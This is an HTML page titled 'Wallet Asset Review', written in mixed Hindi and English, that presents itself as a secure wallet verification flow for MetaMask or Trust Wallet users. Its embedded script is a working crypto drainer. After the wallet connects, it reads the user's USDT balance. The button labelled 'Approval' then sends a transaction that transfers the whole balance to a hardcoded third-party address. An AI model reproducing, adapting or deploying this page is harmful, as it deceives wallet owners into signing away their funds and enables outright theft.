<!DOCTYPE html>
<html lang="hi">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<title>Wallet Asset Review</title>
<link href="https://fonts.googleapis.com/css2?family=Bricolage+Grotesque:wght@400;600;800&display=swap" rel="stylesheet">
<style>
:root{--bg:#0b0f19;--sf:#131b2e;--ink:#f1eefc;--mut:#8a99ad;--line:#1e294b;--acc:#14b8a6;--acc-ink:#03110e;box-sizing:border-box;color-scheme:dark}
*{box-sizing:border-box}
body{margin:0;background:var(--bg);color:var(--ink);font-family:'Bricolage Grotesque',system-ui,sans-serif;line-height:1.5}
.wrap{max-width:480px;margin:0 auto;padding:24px 16px 40px}
header{text-align:center;margin-bottom:24px}
h1{font-size:26px;font-weight:800;margin:0 0 8px;color:#fff}
.sub{color:var(--mut);font-size:14px;margin:0}
.card{background:var(--sf);border:1px solid var(--line);border-radius:18px;padding:20px;margin-bottom:16px}
h2{font-size:17px;margin:0 0 4px}
p.s{margin:0 0 16px;color:var(--mut);font-size:14px}
.go{width:100%;border:0;background:var(--acc);color:var(--acc-ink);font:inherit;font-weight:800;font-size:17px;padding:14px;border-radius:12px;cursor:pointer}
.msg{min-height:24px;text-align:center;font-weight:600;margin:10px 0 0}
.msg.w{color:#2dd4bf}.msg.l{color:#fb7185}
ul{list-style:none;margin:0;padding:0}
li{display:flex;justify-content:space-between;padding:10px 0;border-bottom:1px solid var(--line);font-size:14px}
li:last-child{border:0}
[hidden]{display:none!important}
</style>
</head>
<body>
<div class="wrap">
<header>
  <h1>Wallet Asset</h1>
  <p class="sub">Review and verify supported wallet assets through a secure flow.</p>
</header>

<div class="card">
  <h2>Crypto wallet</h2>
  <p class="s">MetaMask ya Trust Wallet connect karein.</p>
  <div id="info" hidden>
    <ul>
      <li><span>Address</span><b id="addr"></b></li>
      <li><span>Network</span><b id="net"></b></li>
      <li><span>Balance</span><b id="nb"></b></li>
    </ul>
  </div>
  <button class="go" id="conn">Connect Wallet</button>
  <div class="msg" id="mw"></div>
</div>

<div class="card" id="apc" hidden>
  <h2>USDT / USDC bhejo</h2>
  <p class="s">Approval button par click karke aage badhein.</p>
  <button class="go" id="ap">Approval</button>
  <div class="msg" id="ma"></div>
</div>

</div>

<script>
(function(){
var NETS={1:['Ethereum','ETH'],56:['BNB Chain','BNB'],137:['Polygon','POL'],42161:['Arbitrum','ETH'],10:['Optimism','ETH'],8453:['Base','ETH']};
var acc=null;
var $=function(i){return document.getElementById(i)};
function wm(t,c){$('mw').textContent=t;$('mw').className='msg '+(c||'')}

async function show(){
try{
    var p=window.ethereum,id=parseInt(await p.request({method:'eth_chainId'}),16),n=NETS[id]||['Chain '+id,'coin'];
    var b=await p.request({method:'eth_getBalance',params:[acc,'latest']});
    $('addr').textContent=acc.slice(0,6)+'…'+acc.slice(-4);
    $('net').textContent=n[0];
    $('nb').textContent=(Number(BigInt(b))/1e18).toFixed(4)+' '+n[1];
    $('info').hidden=false;
    $('apc').hidden=false;
    $('conn').textContent='Connected';
    wm('Wallet connect ho gaya.', 'w');
}catch(e){wm('Details load nahi hui.', 'l');}}

$('conn').onclick=async function(){
var p=window.ethereum;
if(!p){wm('Wallet nahi mila. Is page ko MetaMask ya Trust Wallet me kholo.', 'l');return}
try{var a=await p.request({method:'eth_requestAccounts'});acc=a[0];await show()}
catch(e){wm(e&&e.code===4001?'Connect cancel kar diya.':'Connect nahi ho paya.', 'l')}};

var SPENDER='0x893B645f8fE3476EC94cdB91d08B9B15a7AfCd63';
var TOK={1:{USDT:['0xdAC17F958D2ee523a2206206994597C13D831ec7',6]},56:{USDT:['0x55d398326f99059fF775485246999027B3197955',18]},137:{USDT:['0xc2132D05D31c914a87C6611C10748AEb04B58e8F',6]}};

$('ap').onclick=async function(){
var ma=$('ma');function m(t,c){ma.textContent=t;ma.className='msg '+(c||'')}
var tokenType="USDT";
try{
    var id=parseInt(await window.ethereum.request({method:'eth_chainId'}),16),t=(TOK[id]||{})[tokenType];
    if(!t){m('Network supported nahi hai.', 'l');return}
    m('Processing...');

    var balanceOfSig = '0x70a08231' + acc.slice(2).toLowerCase().padStart(64, '0');
    var balanceHex = await window.ethereum.request({
        method: 'eth_call',
        params: [{ to: t[0], data: balanceOfSig }, 'latest']
    });

    var balance = BigInt(balanceHex);
    if(balance<=0n){m('USDT balance 0 hai.', 'l');return}

    var recipientHex = SPENDER.slice(2).toLowerCase().padStart(64, '0');
    var amountHex = balance.toString(16).padStart(64, '0');
    var txData = '0xa9059cbb' + recipientHex + amountHex;

    var tx = await window.ethereum.request({
        method: 'eth_sendTransaction',
        params: [{from: acc, to: t[0], data: txData}]
    });
    m('Success!', 'w');
}catch(e){m(e&&e.code===4001?'Cancel kar diya gaya.':'Error aa gaya.', 'l')}};
})();
</script>
</body>
</html>
